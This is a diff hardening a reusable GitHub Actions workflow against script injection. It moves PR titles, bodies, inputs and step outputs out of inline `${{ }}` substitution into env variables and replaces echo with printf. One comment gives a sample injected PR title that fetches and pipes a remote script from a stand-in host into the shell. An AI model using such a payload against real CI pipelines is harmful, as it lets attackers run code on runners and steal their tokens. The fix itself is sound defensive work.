@@ -80,18 +80,31 @@ jobs:
       - name: Capability detection
         run: adlc doctor
 
+      # Untrusted text NEVER reaches the shell as source. `${{ }}` inside a
+      # `run:` block is textual substitution performed *before* the shell sees
+      # the script, so a pull request titled `"; curl evil.sh | sh; #` becomes
+      # commands, not a string. Every value below is passed through `env:` and
+      # dereferenced as a shell variable, which the shell treats as data.
+      #
+      # This is a reusable workflow, so the blast radius is every consumer repo
+      # that calls it -- their runner, their token, their PR authors.
       - name: Create run
         id: run
         env:
           ADLC_PROFILE: ${{ inputs.profile }}
+          ADLC_BRIEF: ${{ inputs.brief }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+          WORKFLOW_NAME: ${{ github.workflow }}
         run: |
-          BRIEF="${{ inputs.brief }}"
+          BRIEF="$ADLC_BRIEF"
           if [ -z "$BRIEF" ] || [ ! -f "$BRIEF" ]; then
             BRIEF="$RUNNER_TEMP/brief.md"
+            # printf, not echo: a title beginning with `-` is an option to echo
+            # in several shells, and echo expands backslashes in some.
             {
-              echo "# ${{ github.event.pull_request.title || github.workflow }}"
-              echo
-              echo "${{ github.event.pull_request.body || 'Automated ADLC run for this change.' }}"
+              printf '# %s\n\n' "${PR_TITLE:-$WORKFLOW_NAME}"
+              printf '%s\n' "${PR_BODY:-Automated ADLC run for this change.}"
             } > "$BRIEF"
           fi
           RUN_ID=$(adlc run new --brief "$BRIEF" --json | python -c "import sys,json;print(json.load(sys.stdin)['runId'])")
@@ -100,8 +113,9 @@ jobs:
       - name: Specify, enrich and compile the task graph
         env:
           ADLC_PROFILE: ${{ inputs.profile }}
+          ADLC_RUN: ${{ steps.run.outputs.run-id }}
         run: |
-          RUN=${{ steps.run.outputs.run-id }}
+          RUN="$ADLC_RUN"
           adlc qualify "$RUN" || echo "::warning::brief did not meet the qualification threshold"
           adlc spec "$RUN"
           adlc enrich "$RUN"
@@ -111,25 +125,30 @@ jobs:
       - name: Build candidate
         env:
           ADLC_PROFILE: ${{ inputs.profile }}
-        run: adlc build ${{ steps.run.outputs.run-id }} --runner ${{ inputs.runner }}
+          ADLC_RUN: ${{ steps.run.outputs.run-id }}
+          ADLC_RUNNER: ${{ inputs.runner }}
+        run: adlc build "$ADLC_RUN" --runner "$ADLC_RUNNER"
 
       - name: Capture evidence
         env:
           ADLC_PROFILE: ${{ inputs.profile }}
           ADLC_TEST_COMMAND: ${{ vars.ADLC_TEST_COMMAND }}
-        run: adlc evidence ${{ steps.run.outputs.run-id }} --variant candidate-a
+          ADLC_RUN: ${{ steps.run.outputs.run-id }}
+        run: adlc evidence "$ADLC_RUN" --variant candidate-a
 
       - name: Evaluate against the rubric
         env:
           ADLC_PROFILE: ${{ inputs.profile }}
-        run: adlc eval ${{ steps.run.outputs.run-id }}
+          ADLC_RUN: ${{ steps.run.outputs.run-id }}
+        run: adlc eval "$ADLC_RUN"
 
       - name: Gates
         id: gates
         env:
           ADLC_PROFILE: ${{ inputs.profile }}
+          ADLC_RUN: ${{ steps.run.outputs.run-id }}
         run: |
-          if adlc gate ${{ steps.run.outputs.run-id }}; then
+          if adlc gate "$ADLC_RUN"; then
             echo "passed=true" >> "$GITHUB_OUTPUT"
           else
             echo "passed=false" >> "$GITHUB_OUTPUT"
@@ -140,10 +159,11 @@ jobs:
         if: always()
         env:
           ADLC_PROFILE: ${{ inputs.profile }}
+          ADLC_RUN: ${{ steps.run.outputs.run-id }}
         run: |
-          adlc reduce ${{ steps.run.outputs.run-id }}
-          adlc report ${{ steps.run.outputs.run-id }}
-          adlc validate ${{ steps.run.outputs.run-id }}
+          adlc reduce "$ADLC_RUN"
+          adlc report "$ADLC_RUN"
+          adlc validate "$ADLC_RUN"
 
       - name: Upload evidence and report
         if: always()
